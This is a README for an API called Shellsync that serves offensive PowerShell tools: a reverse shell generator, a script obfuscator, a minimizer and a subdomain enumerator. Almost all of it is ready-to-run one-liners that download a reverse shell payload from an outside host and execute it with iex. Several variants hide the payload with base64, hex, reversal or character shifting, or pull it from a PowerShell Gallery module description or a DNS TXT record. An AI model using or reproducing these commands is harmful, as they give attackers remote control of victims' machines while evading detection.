Shellsync was put together to give Api access to tooling created by Unit 259 

[Demo'd here in David Bomball Video](https://www.youtube.com/watch?v=JFWnMMte3f0)

Tools: 
1. Reverse Shell Generator 
2. Script Obfuscator 
3. Script Minimizer
4. SubDomain Enumerator

# Reverse Shell Generator

<details>
  <summary>Click to expand</summary>

```markdown
Endpoint: `/api1/revshell`
```

[WebApp Version](https://powershellforhackers.com/tools/revshell/generator) [UNDER CONSTRUCTION - Api is fine]

### Basic Api call

```powershell
irm -Uri 'https://shellsync.app/api1/revshell?i={$IP}&p={$PORT}&key={$ApiKey}' -Method POST | iex
```

### Add Encoding Options with `e` Parameter

| Parameter       | Encoding        |
|-----------------|-----------------|
| b               | Base 64         |
| h               | Hex             |
| u               | Url             |
| a               | Ascii           |
| 0               | Binary          |
| r               | Reverse         |
| x               | Aes Encryption  |
| p               | Padding         |
| s               | Shift {$num}    |
| l               | Shellcode       |


## Parameters are passed individually through a switch statement so you can stack these encoding options

```powershell
irm -Uri 'https://shellsync.app/api1/revshell?i={$IP}&p={$PORT}&key={$ApiKey}&e={ENCODING}' -Method POST | iex
```

### Base64 Execution 

```powershell
[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((irm 'https://shellsync.app/api1/revshell?i={$IP}&p={$PORT}&key={$ApiKey}&e=b' -Method Post))) | clip; gcb | iex
```

### Hex Execution 

```powershell
-join([char[]]((irm 'https://shellsync.app/api1/revshell?i={$IP}&p={$PORT}&key={$ApiKey}&e=h' -Method Post) -split '(..)' | ? { $_ } | % { [convert]::ToInt32($_,16) })) | iex
```

### Reverse Execution 

```powershell
$charArray = (irm 'https://shellsync.app/api1/revshell?i={$IP}&p={$PORT}&key={$ApiKey}&e=r' -Method Post).ToCharArray();[Array]::Reverse($charArray);-join $charArray | iex
```

### PsGallery Execution

```powershell
[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((find-module example).Description)) -replace '[^\x20-\x7E]' | iex
```

### DNS Txt Record

```powershell
resolve-DnsName rev.website.com -Ty TXT | % { $_.Strings -join "" } | iex
```

### Base64 + Shift 2

```powershell
$en=$(irm -Uri 'https://shellsync.app/api1/revshell?i={$IP}&p={$PORT}&key={$ApiKey}&e=b' -Method post);$sa=2;-join([char[]]$en|%{if($_-cmatch'[A-Za-z0-9]'){$nc=[int]$_-$sa;if($_-cmatch'[A-Z]'){$nc=(($nc-[int][char]'A'+26)%26)+[int][char]'A'}elseif($_-cmatch'[a-z]'){$nc=(($nc-[int][char]'a'+26)%26)+[int][char]'a'}elseif($_-cmatch'[0-9]'){$nc=(($nc-[int][char]'0'+10)%10)+[int][char]'0'};[char]$nc}else{$_}})|%{[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($_))}|clip;gcb|iex
```

</details>

# PS Script Obfuscator

<details>
  <summary>Click to expand</summary>

```markdown
Endpoint: `/api1/obfuscate`
```

### Basic Api call

```powershell
irm -Uri 'https://shellsync.app/api1/obfuscate?u=website.com/file&key={$ApiKey}' -Method POST | iex
```
</details>

# PS Script Minimizer

<details>
  <summary>Click to expand</summary>

```markdown
Endpoint: `/api1/mini`
```

### Basic Api call

```powershell
irm -Uri 'https://shellsync.app/api1/mini?u=website.com/file' -Method POST
```
</details>

# Enumerate Subdomains
<details>
  <summary>Click to expand</summary>

```markdown
Endpoint: `/api1/enumsubdomain`
```

[WebApp Version](https://powershellforhackers.com/tools/subdomain/enumerator)

`* Adv Api uses parallel processing and load balancing`

| Method          | Per Minute      |
|-----------------|-----------------|
| WebAppp         | 1.2k min        |
| Api             | 20k  min        |
| Adv Api         | 107k min        |


### Basic Api call

```powershell
irm -Uri 'https://shellsync.app/api1/enumsubdomain?u=website.com&key={$ApiKey}' -Method POST
```
</details>








